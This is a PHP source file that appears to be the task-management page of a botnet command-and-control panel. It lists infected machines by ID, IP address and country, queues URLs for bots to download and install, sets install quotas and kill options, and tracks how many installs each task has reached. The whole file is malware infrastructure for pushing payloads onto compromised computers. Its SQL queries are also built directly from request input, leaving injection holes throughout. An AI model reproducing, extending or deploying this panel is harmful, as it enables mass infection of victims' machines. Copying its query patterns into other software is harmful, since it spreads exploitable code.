<?php

include_once('auth.php');

set_magic_quotes_runtime(1);

if(is_readable('html.php')) include_once('html.php');
 else die('Could not find HTML library.');
 
if(is_readable('mycommon.php')) require('mycommon.php');
else die('Could not open configuration file.');

 if(is_readable('lang.php')) include_once('lang.php');
 else die('Could not find language library.');

$CTRL=1; 
if(!isset($_GET['wohead']))
 include_once('head.php');

$msg = '';
$srch = '';

$mres = mysql_connect($BOT_DBHOST,$BOT_DBLOGIN,$BOT_DBPASS) or die('Check MySQl Options.'.mysql_error());
 if(!mysql_select_db($BOT_DBNAME))
   die('<p><font color=#990000>Could not USE MAIN DB</font><br>Mysql message:'.mysql_error().'</p>');

   
if(isset($_GET['kill']))
 change_kill_opt(intval($_GET['kill']),$mres,'task');
  

 if(isset($_GET['single_kill']))
 change_kill_opt(intval($_GET['single_kill']),$mres,'task_single');
 
   
if(isset($_GET['geturls'])){
 exit(get_urls($_GET['geturls'],$mres));	
};
   


 if(isset($_POST['urls']))
  $msg  .= "<font color=#990000>Message</font>:<em> ".add_task($mres).' task added.</em>';


 if(isset($_GET['del_task'])){   
 	$msg  .= "<font color=#990000>Message</font>:<em> Task stoped for ".free_bots($_GET['del_task'],$mres).' bots.</em>';
   del_task($_GET['del_task'],$mres);
 };
   
 
  if(isset($_GET['del_single_task'])){   
 	$msg  .= "<font color=#990000>Message</font>:<em> Single task stoped.</em>";
   del_single_task($_GET['del_single_task'],$mres);
 };
 
 
 if(isset($_POST['S_COMPID'])){
 $srch = search_bot();
 };
 
 
 $param =array(
 "SRCH"=>$srch,
 "LAND"=>get_land($mres),
 "TASKS"=>get_task($mres),
 "MSG"=>$msg
 );
   
 
 
   
 echo HTML_TASK_ADD($param);  

//include_once('bottom.php'); 
//Functions++++++++++++++++++++++++++



function search_bot(){
global $mres,$_POST;

if($_POST['S_COMPID'] == '')
if($_POST['S_IP'] == '')
return ''; 
	



if($_POST['S_COMPID'] > ''){
	$s_id = str_replace('*',"%",$_POST['S_COMPID']);
$q = 'SELECT * FROM `bots` WHERE `FCompID` like ("'.$s_id.'") limit '.$_POST['S_RESULTS'];
 $result = mysql_query($q,$mres);
  
 return  HTML_serch_res_tbl($result);  
};
 
	
if($_POST['S_IP'] > ''){
	
	$s_ip = str_replace('*',"%",$_POST['S_IP']);
	
 $q = 'SELECT * FROM `bots` WHERE `ip_addr` like ("'.$s_ip.'") limit '.$_POST['S_RESULTS'];
 $result = mysql_query($q,$mres);
 
  return  HTML_serch_res_tbl($result);  
};


	
};



function HTML_serch_res_tbl($result){
global $LNG;	
	
	 $nr = @mysql_num_rows($result);
if(!$nr) 
  return "<font color=#990000>Message</font>:<em> No Entries found.</em>";
	
$ret = " <br><table width=\"543\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\"> "
." <tr class=\"file2\"> "
." <td colspan=\"8\" class=\"bhead\"><div align=\"center\">Select Results</div></td> "
." </tr> "
." <tr class=\"file2\"> "
." <td width=\"21\" bgcolor=#FCFCFC>Add</td> "
." <td width=\"26\" nowrap=\"nowrap\" bgcolor=#FCFCFC>Land</td> "
." <td width=\"82\" bgcolor=#FCFCFC nowrap=\"nowrap\">IP</td> "
." <td width=\"93\" bgcolor=#FCFCFC nowrap=\"nowrap\">Rep. Count total </td> "
." <td width=\"56\" bgcolor=#FCFCFC nowrap=\"nowrap\">Last Report</td> "
." <td width=\"100\" bgcolor=#FCFCFC nowrap=\"nowrap\">First Report</td> "
." <td width=\"40\" bgcolor=#FCFCFC nowrap=\"nowrap\">Bot Ver.</td> "
." <td width=\"44\" bgcolor=#FCFCFC nowrap=\"nowrap\">CompID</td> "
." </tr> ";	
	
   
$cnt =1;
while($row = mysql_fetch_object($result)){
  	 	 	
  	//[27/05/06] 13:39:13
 $ret .= " <tr class=\"file$cnt\"> "
." <td width=\"21\" class=\"file$cnt\"><a href=\"\"><a href=\"javascript:single_load('".$row->FCompID."')\"><img border=0 src=\"img/add.gif\" alt=\"Add to task form\"></a></td> "
." <td width=\"26\" class=\"file$cnt\"><img src=\"img/stat_img/ext_".strtolower($row->FLang).".png\" width=\"14\" height=\"14\" alt=\"".$row->FLang.' | '.@$LNG[strtolower($row->FLang)]."\"></td> "
." <td width=\"82\" class=\"file$cnt\">".$row->ip_addr."</td> "
." <td class=\"file$cnt\">".$row->FRepCnt."</td> "
." <td class=\"file$cnt\">".date("[d/m/y] H:i:s",$row->FLastRepInt)."</td> "
." <td class=\"file$cnt\">".$row->FFirstRep."</td> "
." <td class=\"file$cnt\">".$row->FVer."</td> "
." <td class=\"file$cnt\"><a title=\"".$row->FCompID."\">".substr($row->FCompID,0,5)."...</a></td> "
." </tr> " ;	
  	
  	
  	
  	
  	 if($cnt==2)
     $cnt=1;
     else 
     $cnt=2;
  };
  
$ret .= "</table>";
  
  return $ret;

	
};





function change_kill_opt($id,$mres,$tbl){
	
	$q = "SELECT `Tkill` FROM `".$tbl."` WHERE `Tid`=".$id.";";
	
	//echo  $q;
	$result = mysql_query($q,$mres);
	if(!mysql_num_rows($result))
	 return 0;
	
	$row = mysql_fetch_object($result);
	 
      if($row->Tkill == '1') 
	   $nval = '0';
	   else $nval = '1';

	$q = "UPDATE `".$tbl."` SET `Tkill`=".$nval." WHERE `Tid`=".$id.";";

	mysql_query($q,$mres);
	
	return mysql_affected_rows($mres);	   
};




function get_urls($task,$mres){
 global $HTML_CLEAN_HEAD;
 	
	$q = "SELECT `Turls` FROM `task` WHERE `Tid`=".intval($task).";"; 

	
	$result = mysql_query($q,$mres);
	if(!mysql_num_rows($result))
	return $HTML_CLEAN_HEAD.'<center>No urls present</center>';

	
	$row = mysql_fetch_object($result);

$tbl = 	$HTML_CLEAN_HEAD;
	
$tbl .= "<table width=\"300\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\"> "
." <tr class=\"file2\"> "
."<td colspan=\"2\" class=\"bhead\"><div align=\"center\">Url`s to download </div></td> "
." <tr class=\"file1\"> "
." <td width=\"10\" class=\"file2\">&nbsp;</td> ";

$tbl .=" <td width=\"203\" class=\"file2\">".nl2br($row->Turls)."</td> "; 

$tbl .=" </tr> "
."</table>";

return $tbl;
	
};





function free_bots($task,$mres){
global $BOT_DBTBL;

$q = "SELECT `Tland` FROM `task` WHERE `Tid`=".$task." limit 1;";

$result = mysql_query($q,$mres);
 if(!mysql_num_rows($result))
  return '';
 
  $row = mysql_fetch_object($result);
   
  $q = "UPDATE  `".$BOT_DBTBL."` SET `FQuery`='' WHERE `FLang`='".strtoupper($row->Tland)."';"; 
  mysql_query($q,$mres);
   return mysql_affected_rows($mres);
	
};




function get_land($mres){
global $BOT_DBTBL,$LNG;
 
  $reserv = array();
   $q = "SELECT Tland from `task`";
      $result = mysql_query($q,$mres);
        if(mysql_num_rows($result)){
         while($row = mysql_fetch_object($result)){
         	$reserv[]=$row->Tland;         	
            };        	
        };
 
	$q = 'SELECT `cnt`,`Flang` FROM (SELECT COUNT(`Flang`) as `cnt`,`Flang` FROM `'.$BOT_DBTBL.'`  Group BY Flang ASC) as `bots` order by `cnt` DESC ;';
$result = mysql_query($q);
 if(!mysql_num_rows($result))
 return '';

   
 $ret = ''; //<option>All | All countries</option>
 while($row = mysql_fetch_object($result)){
  $m=0;//tmp value
 	for($i=0;$i<count($reserv);$i++){
 	  	if(strtoupper($row->Flang) == strtoupper($reserv[$i])){
 	  		
 	  	$ret .="<option> [TASK] | ".$LNG[strtolower($row->Flang)]." (".$row->cnt.")</option>";
 	  	$m=1;
 	  	}; 	 	
 	};

 		
 if(!$m) 	
 @$ret .="<option> ".$row->Flang." | ".$LNG[strtolower($row->Flang)]." (".$row->cnt.")</option>";	
 	
 };
	
 return $ret;
 	
};




function add_task($mres){
global $_POST;
	
	if(trim($_POST['compid'])=='')
	 return add_multi_task($mres);
	else	
	 return add_single_task($mres);
		
};




function add_single_task($mres){
global $_POST;

$compid= trim($_POST['compid']);
$urls = $_POST['urls'];
$install = intval($_POST['install']);  

 $kill = (isset($_POST['kill']) ? '0' : '1');
            
 if(isset($_POST['sum'])){         
$urlscnt = explode('<br />',nl2br(trim($urls)));
  $install = ($install * count($urlscnt));
 };
 
$time = time(0);

$q = "SELECT * FROM `task_single` WHERE `TCompId`='".$compid."' limit 1;";
 if(mysql_num_rows(mysql_query($q,$mres))){
   return  'Bot Id  :'.$compid.' already present in Tasks. No';
 };

 $q = "INSERT INTO `task_single`(`TCompId`,`Tinstall`,`Tinstalled`,`Ttime`,`Turls`,`Tkill`) values('".$compid."',$install,0,".$time.",'".$urls."','".$kill."')";
  
  mysql_query($q,$mres);
   return mysql_affected_rows($mres);

		
};







function add_multi_task($mres){
global $_POST;

$land = trim(substr(trim($_POST['land']),0,3));
$urls = $_POST['urls'];
$install = $_POST['install']; 
           $install = intval($install); 

 $kill = (isset($_POST['kill']) ? '0' : '1');
            
 if(isset($_POST['sum'])){         
$urlscnt = explode('<br />',nl2br(trim($urls)));
  $install = ($install * count($urlscnt));
 };
 

 
$time = time(0);

if($land=='[TA')
 return 'No';

$q = "SELECT * FROM `task` WHERE `Tland`='".$land."' limit 1;";
 if(mysql_num_rows(mysql_query($q,$mres))){
   return  'Country :'.$land.' already present in Tasks. No';
 };
 
 $q = "INSERT INTO `task`(`Tland`,`Tinstall`,`Tinstalled`,`Ttime`,`Turls`,`Tkill`) values('".$land."',$install,0,".$time.",'".$urls."','".$kill."')";
  
  mysql_query($q,$mres);
   return mysql_affected_rows($mres);
 
};



function get_task($mres){
global $LNG;

	$q = "SELECT * FROM `task` order by `Ttime` DESC";

	
$tbl = "<table width=\"562\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\"> "
."<tr>"
."<td colspan=\"8\" class=\"bhead\"><div align=\"center\">Tasks</div></td></tr>";	
	
$result = mysql_query($q,$mres);
if(mysql_num_rows($result)){

	
	

$tbl .=" </tr> "
." <tr class=\"file2\"> "
." <td width=\"28\" bgcolor=#FCFCFC>Land</td> "
." <td width=\"76\" nowrap=\"nowrap\" bgcolor=#FCFCFC>Bot`s count </td> "
." <td width=\"55\" bgcolor=#FCFCFC nowrap=\"nowrap\">Installed </td> "
." <td width=\"50\" bgcolor=#FCFCFC nowrap=\"nowrap\">To install </td> "
//." <td width=\"76\" bgcolor=#FCFCFC nowrap=\"nowrap\">Kill after job</td>"
." <td width=\"200\" bgcolor=#FCFCFC>Url`s</td> "
." <td width=\"41\" bgcolor=#FCFCFC nowrap=\"nowrap\">Done </td> "
." <td width=\"58\" bgcolor=#FCFCFC>Action</td> "
." </tr> ";


$cnt =1;
while($row = mysql_fetch_object($result)){
	
	 $inst = get_installed($row->Tland,$mres);
	 $perc = @round(($inst/$row->Tinstall)*100);
	  $perc = ($perc>=89 ? '<font color=#00CC00>'.$perc.'</font>' : '<font color=#000000>'.$perc.'</font>');

	  if($row->Tinstall==0)
	   $perc =" -- ";
$tbl .=	" <tr class=\"file".$cnt."\"> "
." <td  class=\"file".$cnt."\"><img src=\"img/stat_img/ext_".strtolower($row->Tland).".png\" width=\"14\" height=\"14\" alt=\"".$row->Tland.' | '.@$LNG[strtolower($row->Tland)]."\"></td> "
." <td  class=\"file".$cnt."\">".get_bots_cnt($row->Tland,$mres)."</td> "
." <td  class=\"file".$cnt."\">".$inst."</td> "
." <td  class=\"file".$cnt."\">".($row->Tinstall==0 ? '* - unlim.' : $row->Tinstall)."</td> "
//." <td class=\"file".$cnt."\">".($row->Tkill == '1' ? '<a href="task.php?kill='.$row->Tid.'">Yes</a>' : '<a href="task.php?kill='.$row->Tid.'">No</a>')."</td> "
." <td  class=\"file".$cnt."\">".(strlen($row->Turls)>35 ? substr($row->Turls,0,35).'<a href="javascript:link(\''.$row->Tid.'\');" title="Show all">...</a>' : $row->Turls)."</td> "
." <td  class=\"file".$cnt."\">".$perc."%</td> "
." <td class=\"file".$cnt."\"><a href=\"?del_task=".$row->Tid."\" title=\"Erease task record and downloaded-files-statiscs for these country.\">Delete</a></td> "
." </tr> ";

 if($cnt==2)
     $cnt=1;
     else 
     $cnt=2;
	
};

}else 
 echo '<center><p>No Multi load tasks Present.</p></center>';


 // SINGLE TASK HTML TABLE
$q = "SELECT * FROM `task_single` order by `Ttime` DESC";

$result = mysql_query($q,$mres);
if(mysql_num_rows($result)){
	
		$tbl .="<td colspan=\"8\" bgcolor=#FCFCFC>&nbsp;</td></tr>"	
		       ."<td colspan=\"8\" class=\"bhead\"><div align=\"center\"> Single-load Tasks</div></td></tr>";	
	
	$tbl .=" </tr> "
." <tr class=\"file2\"> "
." <td width=\"68\" bgcolor=#FCFCFC >IP Adress</td> "
." <td width=\"22\" bgcolor=#FCFCFC >CompID</td> "
." <td width=\"55\" bgcolor=#FCFCFC nowrap=\"nowrap\">Installs </td> "
." <td width=\"50\" bgcolor=#FCFCFC nowrap=\"nowrap\">To install </td> "
//." <td width=\"76\" bgcolor=#FCFCFC nowrap=\"nowrap\">Kill after job</td>"
." <td width=\"200\" bgcolor=#FCFCFC>Url`s</td> "
." <td width=\"41\" bgcolor=#FCFCFC nowrap=\"nowrap\">Done </td> "
." <td width=\"58\" bgcolor=#FCFCFC>Action</td> "
." </tr> ";
	



$cnt =1;
while($row = mysql_fetch_object($result)){
	
		 $inst = get_installed(get_bot_ip($row->TCompId,$mres),$mres);
	 $perc = @round(($inst/$row->Tinstall)*100);
	  $perc = ($perc>=89 ? '<font color=#00CC00>'.$perc.'</font>' : '<font color=#000000>'.$perc.'</font>');
       
	  
	  if($row->Tinstall==0)
	   $perc =" -- ";
$tbl .=	" <tr class=\"file".$cnt."\"> "
." <td  class=\"file".$cnt."\">".get_bot_ip($row->TCompId,$mres)."&nbsp;</td> "
." <td  class=\"file".$cnt."\" >".substr($row->TCompId,0,10)."<a title=\"".$row->TCompId."\">...</a></td> "
." <td  class=\"file".$cnt."\">".$inst."</td> "
." <td  class=\"file".$cnt."\">".($row->Tinstall==0 ? '* - unlim.' : $row->Tinstall)."</td> "
//." <td class=\"file".$cnt."\">".($row->Tkill == '1' ? '<a href="task.php?single_kill='.$row->Tid.'">Yes</a>' : '<a href="task.php?single_kill='.$row->Tid.'">No</a>')."</td> "
." <td  class=\"file".$cnt."\">".(strlen($row->Turls)>15 ? substr($row->Turls,0,15).'<a href="javascript:link(\''.$row->Tid.'\');" title="Show all">...</a>' : $row->Turls)."</td> "
." <td  class=\"file".$cnt."\">".$perc."%</td> "
." <td class=\"file".$cnt."\"><a href=\"?del_single_task=".$row->Tid."\" title=\"Erease task record and downloaded-files-statiscs for these country.\">Delete</a></td> "
." </tr> ";

 if($cnt==2)
     $cnt=1;
     else 
     $cnt=2;
	
};



	
	
	
	
}; //else
 //echo '<center><p>No Single load tasks Present.</p></center>';





$tbl .= "</table>";
	
return $tbl;
};





function get_bot_ip($id,$mres){
	
$q = 'SELECT * FROM `bots` WHERE `FCompId`="'.$id.'" Limit 1';	
 $row = mysql_fetch_object(mysql_query($q,$mres));
 return $row->ip_addr;
};


function get_bots_cnt($land,$mres){
global $BOT_DBTBL;
	$q = "SELECT count(`Flang`) as cnt FROM `".$BOT_DBTBL."`  WHERE `Flang` = '".$land."';";	
	
		if($land == 'All')
	  $q = "SELECT count(`Fidx`) as cnt FROM `".$BOT_DBTBL."`;";
	
$result = mysql_query($q,$mres);
 if(!mysql_num_rows($result))
    return '';
    
  $row = mysql_fetch_object($result);
return  $row->cnt;  		
};




function del_single_task($id,$mres){
	
	
$q = 'SELECT * FROM `task_single` WHERE `Tid`='.$id.' limit 1';
 $row = mysql_fetch_object(mysql_query($q,$mres));
	

 	//del from files stats
$q = 'DELETE FROM `downfiles` WHERE `Dland`="'.get_bot_ip($row->TCompId,$mres).'"';		
mysql_query($q,$mres);	
	
   //del from task table
$q = 'DELETE  FROM `task_single` WHERE `Tid`='.$id.' limit 1';	
 mysql_query($q,$mres);	

	return mysql_affected_rows($mres);
 
};






function del_task($id,$mres){
$id= intval($id);


$q = 'SELECT * FROM `task` WHERE `Tid`='.$id.' limit 1';
 $row = mysql_fetch_object(mysql_query($q,$mres));
 
 //del from bots table
$q = "UPDATE `bots` SET `FExecuted`='' WHERE `FLang`='".strtoupper($row->Tland)."';";
mysql_query($q,$mres); 
 
 
	//del from files stats
$q = 'DELETE FROM `downfiles` WHERE `Dland`="'.strtoupper($row->Tland).'"';		
mysql_query($q,$mres);	
	
   //del from task table
$q = 'DELETE  FROM `task` WHERE `Tid`='.$id.' limit 1';	
 mysql_query($q,$mres);	

	return mysql_affected_rows($mres);
		
};


function get_installed($land,$mres){

	$q = "SELECT sum(`Dcnt`) as `Dcnt` FROM `downfiles` WHERE `Dland`='".strtoupper($land)."';";
  $result = @mysql_query($q,$mres);
	if(!mysql_num_rows($result))
	 return 0;
	 
	$row = mysql_fetch_object($result);

	return $row->Dcnt;
	  	 
};




function is_set_all($mres){
	
	$q = 'SELECT * FROM `task` WHERE `Tland` = "All"';	
  $result =	mysql_query($q,$mres);
	
 return mysql_num_rows($result);	
	
};

?>